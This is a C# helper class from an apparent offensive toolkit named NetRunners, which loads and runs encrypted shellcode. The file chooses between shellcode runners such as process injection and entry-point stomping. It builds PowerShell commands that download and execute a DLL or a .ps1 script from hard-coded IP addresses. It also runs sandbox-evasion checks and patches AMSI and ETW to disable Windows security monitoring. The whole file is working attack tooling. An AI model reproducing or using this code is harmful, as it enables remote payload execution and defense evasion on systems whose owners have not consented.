using System;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Decryptors.AesDecryptor;
using NetRunners.Patchers;
using NetRunners.Heuristics;
using NetRunners.Runners;
using NetRunners.Interfaces;

namespace NetRunners.Helpers
{
    public static class Helper
    {
        /// <summary>
        /// This method selects which runner to run when calling a shellcode runner using InstallUtil or Loading NetRunnersDll.
        /// Uncomment your choice
        /// </summary>
        /// <affects>
        /// NetRunners.exe      (installutil)
        /// NetRunnersDll.dll   (Reflective Dll Loading) (DotNet2JScript) (Gadget2JScript)
        /// NetRunnersSvc.exe
        /// </affects>
        public static void SelectRunner()
        {
            //IRunner runner = new DefaultRunner();
            //IRunner runner = new ProcessInjectionRunner();
            IRunner runner = new EntryPointStompingRunner();

            return;
        }
        /// <summary>
        /// This method selects which command to run when executing Clm.exe, printspoofer.exe using installutil or uac.exe with no arguments.
        /// Uncomment your choice
        /// </summary>
        /// <affects>
        /// Clm.exe             (installutil)
        /// PrintSpoofer.exe    (installutil)
        /// Uac.exe             (default command to execute)
        /// </affects>
        public static string SelectCmd()
        {
            // command to execute, uncomment and edit your choice

            //// REFLECTIVE DLL LOAD COMMANDS
            // instantiated invocation
            //string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).CreateInstance('NetRunnersDll.TestClass')";
            // static method invocation (old netrunners)
            //string cmd = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.220/bin/x64/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)";
            
            //// IEX COMMANDS
            string cmd = "powershell -c Invoke-Expression(New-Object Net.Webclient).downloadstring(\"http://192.168.45.167:80/ps1/runner/NetRunners.ps1\")";

            return cmd;
        }
        /// <summary>
        /// This method execute vairous evasive functions. If any fail, the program exits.
        /// </summary>
        /// <remarks>
        /// Sometimes it is necessary to skip patching amsi, in that case comment the call out
        /// </remarks>
        /// <affects>
        /// All binaries in this solution
        /// </affects>
        public static void PerformChecks()
        {
            if (
                !SleepHeuristic.Check()
                || !NonEmulatedApiHeuristic.Check()
                || !EtwPatcher.Patch()
                || !AmsiPatcher.Patch()
            )
            {
                Environment.Exit(1);
            }
        }
        /// <summary>
        /// This method selects the correct shellcode depending on the bitness of the process.
        /// </summary>
        /// <affects>
        /// NetRunners.exe
        /// NetRunnersDll.dll
        /// NetRunnersSvc.exe
        /// </affects>
        public static byte[] GetPayload()  // for shellcode runners
        {
            // define buf var using bitness
            byte[] buf = (IntPtr.Size == 8) 
                ? Data.EncryptedData.buf                                // x64 payload
                : Data.EncryptedData.buf86;                             // x86 payload

            return buf;
        }
        /// <summary>
        /// This method selects the correct unencrypted shellcode size depending on the bitness of the process.
        /// </summary>
        /// <affects>
        /// NetRunners.exe
        /// NetRunnersDll.dll
        /// NetRunnersSvc.exe
        /// </affects>        
        public static int GetSize()
        {
            // define buf var using bitness
            int sBuf = (IntPtr.Size == 8)
                ? Data.EncryptedData.sBuf                                // x64 payload
                : Data.EncryptedData.sBuf86;                             // x86 payload

            return sBuf;
        }
        /// <summary>
        /// This method selects the correct patch payload on the bitness of the process.
        /// </summary>
        public static byte[] GetAmsiPatch()
        {
            byte[] patch;

            // retrieve correct patch
            patch = (IntPtr.Size == 8)
                ? DecryptBytesToBytesAes(AmsiPatch, AesKey)             // x64 payload
                : DecryptBytesToBytesAes(AmsiPatch86, AesKey);          // x86 payload

            return patch;
        }
        /// <summary>
        /// This method selects the correct patch payload on the bitness of the process.
        /// </summary>
        public static byte[] GetEtwPatch()
        {
            byte[] patch;

            // retrieve correct patch (in this case it is always a ret func, but we are keeping this method here in case patches change)
            patch = new byte[] { 0xc3 };

            return patch;
        }
    }
}
